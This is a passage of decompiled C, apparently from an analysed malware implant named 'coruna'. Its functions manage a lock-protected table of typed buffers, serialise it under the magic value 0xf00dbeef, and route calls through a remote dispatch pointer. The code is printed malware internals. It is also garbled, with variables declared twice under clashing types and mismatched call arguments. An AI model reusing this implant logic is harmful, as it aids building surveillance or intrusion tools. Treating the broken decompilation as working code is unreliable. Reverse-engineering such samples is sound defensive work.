        ptr = (uint64_t *)((long)ptr + 0x18);
        u = coruna_pacia_3(*ptr,ptr);
        *ptr = u;
        val[3] = ptr;
      }
    }
  }
  return;
}
void coruna_implant6dec_via_pthread_rwlock_destroy(uint64_t *val)
{
  int err;
  uint32_t *ptr;
  uint64_t scratch;
  
  if (val != (uint64_t *)0x0) {
    scratch = 0;
    err = coruna_pthread_rwlock_init(&scratch);
    if (err == 0) {
      ptr = _calloc(1,0x38);
      if (ptr == (uint32_t *)0x0) {
        coruna_pthread_rwlock_destroy(scratch);
      }
      else {
        *ptr = 0x10001;
        *(uint64_t *)(ptr + 2) = scratch;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_pthread_rwlock_unlock;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_pthread_rwlock_rdlock_118f8;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_pthread_rwlock_rdlock_11998;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_pthread_rwlock_unlock_11aac;
        *val = ptr;
      }
    }
  }
  return;
}
void coruna_ctx_free_11534(uint64_t *val)
{
  if ((val != (uint64_t *)0x0) && (val[1] != 0)) {
    coruna_pthread_rwlock_destroy();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    _free(val);
  }
  return;
}
void coruna_implant6dec_via_ctx_free_11534(long *handle,long addr_2)
{
  long handle;
  uint u;
  uint size;
  bool err;
  int err;
  long addr;
  unsigned long version;
  uint *ptr;
  uint scratch;
  void *bootargs;
  uint64_t thread_attr;
  long host_info;
  
  host_info = 0;
  if (((handle != (long *)0x0) && (addr_2 != 0)) &&
     (err = coruna_implant6dec_via_pthread_rwlock_destroy(&host_info,0x18), err == 0)) {
    addr = *(long *)(host_info + 8);
    ptr = (uint *)(addr_2 + 0x150);
    version = 0;
    do {
      size = ptr[-4];
      if (size == 0) {
fail:
        err = 0;
      }
      else {
        if ((*(long *)(ptr + -2) == 0) || (*ptr == 0)) goto done;
        thread_attr = 0;
        err = coruna_implant_prepare_slot(addr,size,&thread_attr);
        if (err == 0x7003) {
          u = *(uint *)(addr + 0xe8);
          if (u < *(uint *)(addr + 0xe4)) {
            err = 0;
            handle = addr + (unsigned long)u * 0x20;
            *(uint *)(handle + 0xf0) = size;
            *(uint8_t *)(handle + 0xf8) = 2;
            *(uint64_t *)(handle + 0x100) = *(uint64_t *)(ptr + -2);
            *(uint *)(handle + 0x108) = *ptr;
            *(uint *)(addr + 0xe8) = u + 1;
          }
          else {
            err = 0x7006;
          }
        }
        else if (err == 0) {
          bootargs = (void *)0x0;
          scratch = 0;
          err = coruna_implant_resolve_typed_buffer(addr,thread_attr,&bootargs,&scratch);
          if (err == 0) {
            size = *ptr;
            if (((bootargs == *(void **)(ptr + -2)) && (scratch == size)) ||
               ((scratch == size &&
                (err = _memcmp(bootargs,*(void **)(ptr + -2),(unsigned long)size), err == 0))))
            goto fail;
            err = 0x700a;
          }
        }
      }
      if (err != 0) break;
      ptr = ptr + 0xc;
      err = version < 0x17;
      version = version + 1;
    } while (err);
    if (err == 0) {
      *handle = host_info;
    }
    else {
done:
      coruna_ctx_free_11534(host_info);
    }
  }
  return;
}
void coruna_pthread_rwlock_unlock(long handle,long addr_2,uint64_t val)
{
  int err;
  pthread_rwlock_t *ptr;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) &&
     (err = _pthread_rwlock_wrlock(ptr), err == 0)) {
    coruna_implant6dec_via_implant_resolve_typed_buffer(ptr,2,addr_2,val);
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_pthread_rwlock_rdlock(long handle,uint64_t val,long addr_2,long off_3)
{
  int err;
  pthread_rwlock_t *ptr;
  uint64_t scratch;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      ((ptr != (pthread_rwlock_t *)0x0 && (int)val != 0) && addr_2 != 0) && off_3 != 0))
     && (err = _pthread_rwlock_rdlock(ptr), err == 0)) {
    scratch = 0;
    err = coruna_implant_prepare_slot(ptr,val,&scratch);
    if (err == 0) {
      coruna_implant_resolve_typed_buffer(ptr,scratch,addr_2,off_3);
    }
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_pthread_rwlock_rdlock_118f8(long handle,long addr_2,long off_3)
{
  int err;
  pthread_rwlock_t *ptr;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) &&
     (err = _pthread_rwlock_rdlock(ptr), err == 0)) {
    coruna_bzero(ptr,addr_2,off_3);
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_pthread_rwlock_rdlock_11998(long handle,long addr_2,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0)) &&
     (err = _pthread_rwlock_rdlock(ptr), err == 0)) {
    if (*(int *)(ptr[1].__opaque + 0x18) != 0) {
      u = *(uint32_t *)(ptr[1].__opaque + 0x20);
      bootargs = 0;
      scratch = 0;
      err = coruna_implant_resolve_typed_buffer(ptr,ptr[1].__opaque + 0x20,&bootargs,&scratch);
      if (err == 0) {
        coruna_implant6dec_via_pacia_3_3(handle,u,bootargs,scratch,val);
      }
    }
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_pthread_rwlock_unlock_11aac(long handle,uint64_t val,void *ctx,uint size)
{
  int err;
  void *ptr;
  pthread_rwlock_t *ptr;
  void *buf;
  uint32_t scratch;
  uint64_t bootargs;
  long thread_attr;
  
  if (((handle != 0) &&
      (ptr = *(pthread_rwlock_t **)(handle + 8),
      ((ptr != (pthread_rwlock_t *)0x0 && (int)val != 0) && ctx != (void *)0x0) &&
      size != 0)) && (err = _pthread_rwlock_wrlock(ptr), err == 0)) {
    thread_attr = 0;
    err = coruna_implant_prepare_slot(ptr,val,&thread_attr);
    if (err == 0) {
      ptr = _malloc((unsigned long)size);
      if (ptr != (void *)0x0) {
        _memcpy(ptr,ctx,(unsigned long)size);
        if (*(char *)(thread_attr + 8) == '\x03') {
          buf = *(void **)(thread_attr + 0x10);
          _bzero(buf,(unsigned long)*(uint *)(thread_attr + 0x18));
          _free(buf);
        }
        else if (*(char *)(thread_attr + 8) == '\x01') {
          _bzero((void *)(*(long *)(ptr[1].__opaque + 8) + *(long *)(thread_attr + 0x10)),
                 (unsigned long)*(uint *)(thread_attr + 0x18));
        }
        *(uint8_t *)(thread_attr + 8) = 3;
        *(void **)(thread_attr + 0x10) = ptr;
        *(uint *)(thread_attr + 0x18) = size;
        if (ptr[1].__sig != 0) {
          bootargs = 0;
          scratch = 0;
          err = coruna_bzero(ptr,&bootargs,&scratch);
          if (err == 0) {
            coruna_implant6dec_via_pacia_3_3(ptr[1].__sig,val,bootargs,scratch,*(uint64_t *)ptr[1].__opaque
                        );
          }
        }
      }
    }
    _pthread_rwlock_unlock(ptr);
  }
  return;
}
void coruna_implant_resolve_typed_buffer(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  long handle;
  
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return;
      }
    }
    else {
      if (err != '\x01') {
        return;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return;
}
void coruna_implant6dec_via_implant_resolve_typed_buffer(long handle,int flags,int *count_2,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  int err;
  uint version;
  int status;
  int flags;
  unsigned long port;
  long handle;
  unsigned long tag;
  int *status;
  uint *ptr;
  unsigned long kind;
  uint *buf;
  uint scratch;
  void *bootargs;
  
  if ((((handle != 0) && (count_2 != (int *)0x0)) && (size != 0)) &&
     ((7 < size && (*count_2 == -0xff24111)))) {
    version = count_2[1];
    if ((version != 0) &&
       ((size = (unsigned long)version << 4 | 8, size <= size &&
        (err = *(int *)(handle + 0xe8), version <= (uint)(*(int *)(handle + 0xe4) - err))))) {
      tag = 0;
      while (err = count_2 + tag * 4 + 2, *err != 0) {
        buf = (uint *)(err + 2);
        version = *buf;
        if (version < (uint)size) {
          return;
        }
        ptr = (uint *)(count_2 + tag * 4 + 5);
        if (*ptr == 0) {
          return;
        }
        u = *ptr + version;
        if (u <= version || size < u) {
          return;
        }
        kind = 0xffffffffffffffff;
        status = (int *)(handle + 0xf0);
        do {
          version = *(uint *)(handle + 0xe8);
          kind = kind + 1;
          if (version <= kind) {
            if (flags == 2) {
              port = (unsigned long)(uint)(err + (int)tag);
              handle = handle + port * 0x20;
              *(uint64_t *)(handle + 0xf0) = *(uint64_t *)err;
              *(uint8_t *)(handle + 0xf8) = 2;
              kind = (long)count_2 + (unsigned long)*buf;
            }
            else {
              if (flags != 1) {
                return;
              }
              port = (unsigned long)(uint)(err + (int)tag);
              handle = handle + port * 0x20;
              *(uint64_t *)(handle + 0xf0) = *(uint64_t *)err;
              *(uint8_t *)(handle + 0xf8) = 1;
              kind = (unsigned long)*buf;
            }
            *(unsigned long *)(handle + 0x100) = kind;
            *(uint *)(handle + port * 0x20 + 0x108) = *ptr;
            *(uint *)(handle + 0xe8) = version + 1;
            goto fail;
          }
          if (*err == *status) {
            bootargs = (void *)0x0;
            scratch = 0;
            status = coruna_implant_resolve_typed_buffer(handle,status,&bootargs,&scratch);
            if (status == 0) {
              version = *ptr;
              if (bootargs == (void *)((long)count_2 + (unsigned long)*buf) && scratch == version) {
                status = 0;
              }
              else {
                if (scratch == version) {
                  flags = _memcmp(bootargs,(void *)((long)count_2 + (unsigned long)*buf),(unsigned long)version);
                  status = 0;
                  if (flags == 0) goto done;
                }
                status = 0x700a;
              }
            }
          }
          else {
            status = 0x7003;
          }
done:
          status = status + 8;
        } while (status == 0x7003);
        if (status != 0) {
          return;
        }
fail:
        tag = tag + 1;
        if ((uint)count_2[1] <= tag) {
          return;
        }
      }
    }
  }
  return;
}
void coruna_bzero(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  long handle;
  unsigned long version;
  uint64_t *buf;
  unsigned long port;
  uint *str;
  uint scratch;
  void *bootargs;
  
  if ((((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) &&
     (*(int *)(handle + 0xe8) != 0)) {
    version = 0;
    port = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
    handle = handle + 0xf0;
    size = port;
    do {
      bootargs = (void *)0x0;
      scratch = 0;
      err = coruna_implant_resolve_typed_buffer(handle,handle,&bootargs,&scratch);
      if (err != 0) {
        return;
      }
      version = version + 1;
      u = (scratch + 0x1f & 0xffffffe0) + (int)size;
      size = (unsigned long)u;
      handle = handle + 0x20;
    } while (version < *(uint *)(handle + 0xe8));
    ptr = _malloc(size);
    if (ptr != (uint32_t *)0x0) {
      _bzero(ptr,size);
      err = *(int *)(handle + 0xe8);
      *ptr = 0xf00dbeef;
      ptr[1] = err;
      if (err != 0) {
        version = 0;
        str = ptr + 5;
        buf = (uint64_t *)(handle + 0xf0);
        do {
          bootargs = (void *)0x0;
          scratch = 0;
          err = coruna_implant_resolve_typed_buffer(handle,buf,&bootargs,&scratch);
          if (err != 0) {
            _bzero(ptr,size);
            _free(ptr);
            return;
          }
          str[-1] = (uint)port;
          *str = scratch;
          *(uint64_t *)(str + -3) = *buf;
          _memcpy((void *)((long)ptr + port),bootargs,(unsigned long)scratch);
          port = (unsigned long)((scratch + 0x1f & 0xffffffe0) + (uint)port);
          version = version + 1;
          str = str + 4;
          buf = buf + 4;
        } while (version < *(uint *)(handle + 0xe8));
      }
      *val = ptr;
      *size = u;
    }
  }
  return;
}
void coruna_implant_prepare_slot(long handle,int flags,uint64_t *val)
{
  int *err;
  unsigned long u;
  
  if (((handle != 0) && (flags != 0)) && (val != (uint64_t *)0x0)) {
    u = (unsigned long)*(uint *)(handle + 0xe8);
    if (*(uint *)(handle + 0xe8) != 0) {
      err = (int *)(handle + 0xf0);
      do {
        if (*err == flags) {
          *val = err;
          return;
        }
        err = err + 8;
        u = u - 1;
      } while (u != 0);
    }
    return;
  }
  return;
}
void coruna_pthread_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return;
  }
  return;
}
void coruna_pthread_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr != (pthread_rwlock_t *)0x0) {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
      }
    }
  }
  return;
}





void coruna_nop_stub(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_implant_remote_dispatch != 0) {
    coruna_pacia_3();
    coruna_implant_remote_handler(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}





void coruna_implant6dec_via_pacia_3_3(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_implant_remote_dispatch != 0) {
    coruna_pacia_3();
    coruna_implant_remote_handler(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}
void coruna_pacia_3(void)
{
  return;
}
void coruna_pacia_4(void)
{
  return;
}
void coruna_pacia_5(void)
{
  return;
}
void coruna_pacia_6(void)
{
  return;
}





void coruna_implant_remote_stub(uint64_t val,uint64_t id_2)
{
  (*k_implant_remote_dispatch)(0xb389,val,id_2,k_implant_remote_arg_a);
  return;
}





void coruna_implant_remote_handler(uint64_t val,uint64_t id_2)
{
  (*k_implant_remote_dispatch)(0xb389,val,id_2,k_implant_remote_arg_b);
  return;
}

